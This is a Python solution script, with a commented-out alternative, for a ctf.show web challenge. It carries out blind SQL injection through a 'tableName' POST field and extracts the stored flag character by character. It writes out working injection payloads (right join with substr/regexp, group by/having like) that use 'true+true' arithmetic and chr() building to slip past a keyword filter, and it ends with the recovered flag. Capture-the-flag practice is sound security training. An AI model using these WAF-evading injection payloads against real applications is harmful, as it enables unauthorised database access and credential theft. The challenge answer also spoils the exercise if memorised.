# @Author:Y4tacker
import requests

url = "http://d363cedd-8e0e-4569-8154-9ec407fb05c2.chall.ctf.show:8080/select-waf.php"

flag = 'flag is '


def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
    return num


for i in range(45):
    if i <= 5:
        continue
    for j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 43;") > 0:
            if chr(j) != ".":
                flag += chr(j)
                print(data)
                print(f'j={j},chr={chr(j)}')
                # print(flag)
                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break
# @Author:feng
#
# def str_to_hex(s):
#     return ''.join([hex(ord(c)).replace('0x', '') for c in s])
#
# def createNum(n):
#     num = 'true'
#     if n == 1:
#         return 'true'
#     else:
#         for i in range(n - 1):
#             num += "+true"
#     return num
#
# def createStrNum(s):
#     str=""
#     str+="chr("+createNum(ord(s[0]))+")"
#     for i in s[1:]:
#         str+=",chr("+createNum(ord(i))+")"
#     return str
#
# url="http://d363cedd-8e0e-4569-8154-9ec407fb05c2.chall.ctf.show:8080/select-waf.php"
#
# flag="ctfshow{"
# for i in range(0,100):
#     for j in "0123456789abcdefghijklmnopqrstuvwxyz-{}":
#         data={
#             'tableName':"ctfshow_user group by pass having pass like(concat({}))".format(createStrNum(flag+j+"%"))
#         }
#         r=requests.post(url=url,data=data).text
#         if "$user_count = 0;" not in r:
#             flag+=j
#             print(flag)
#             if j=='}':
#                 exit()
#             break

# ctfshow{8eae78b1-2562-43e9-9484-22fee2361c6e}